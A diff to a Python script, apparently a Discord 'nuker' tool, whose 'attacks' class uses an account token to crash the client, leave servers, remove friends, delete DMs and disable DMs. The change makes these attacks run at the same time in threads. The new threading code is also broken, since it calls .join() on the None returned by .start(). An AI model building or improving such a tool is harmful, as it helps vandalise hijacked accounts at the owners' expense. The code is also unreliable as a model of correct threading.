@@ -1,4 +1,4 @@
-import requests, os, time, random, string
+import requests, os, time, random, string, threading
 
 class attacks():
 
@@ -160,15 +160,16 @@ def main():
         a = input("[*] Are you sure? (Y/n)")
         if a.lower() != "n":
             os.system("cls")
-            attacks.client_crasher(token)
-            os.system("cls")
-            attacks.server_leaver(token)
-            os.system("cls")
-            attacks.friend_remover(token)
-            os.system("cls")
-            attacks.dm_remover(token)
-            os.system("cls")
-            attacks.disable_dms(token)
+            thread1 = threading.Thread(target=attacks.client_crasher, args=(token,)).start()
+            thread2 = threading.Thread(target=attacks.server_leaver, args=(token,)).start()
+            thread3 = threading.Thread(target=attacks.friend_remover, args=(token,)).start()
+            thread4 = threading.Thread(target=attacks.dm_remover, args=(token,)).start()
+            thread5 = threading.Thread(target=attacks.disable_dms, args=(token,)).start()
+            thread1.join()
+            thread2.join()
+            thread3.join()
+            thread4.join()
+            thread5.join()
             input("\n[*] Attack executed, press enter to continue.. ")
             time.sleep(1)
             os.system("cls")
